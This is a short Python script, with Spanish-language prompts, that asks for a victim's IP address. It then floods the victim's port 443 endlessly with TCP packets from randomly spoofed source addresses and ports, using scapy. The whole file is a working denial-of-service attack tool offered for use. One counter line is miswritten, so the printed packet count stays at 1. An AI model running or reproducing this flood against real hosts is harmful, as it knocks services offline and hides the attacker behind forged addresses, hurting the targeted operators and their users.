#!/usr/local/bin/python3
# -*- coding: utf-8 -*-

import random
import scapy
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

victima = input ("Ingrese el ip de la victima:\n")
numero_paquete = 1

while True:
    a = str(random.randint(1, 255))
    b = str(random.randint(1, 255))
    c = str(random.randint(1, 255))
    d = str(random.randint(1, 255))
    dot = "."
    src = a+dot+b+dot+c+dot+d
    print(src)
    st = random.randint(1, 1000)
    en = random.randint(1000, 65535)
    loop_break = 0
    for srcport in range (st, en):
        IP1 = IP(src=src, dst=victima)
        TCP1 = TCP(sport=srcport, dport=443)
        pkt = IP1/TCP1
        send(pkt,inter=.0001)
        print("Paquetes enviados: {}".format(numero_paquete))
        loop_break = loop_break + numero_paquete
        numero_paquete = numero_paquete =1
        if loop_break == 50:
            break
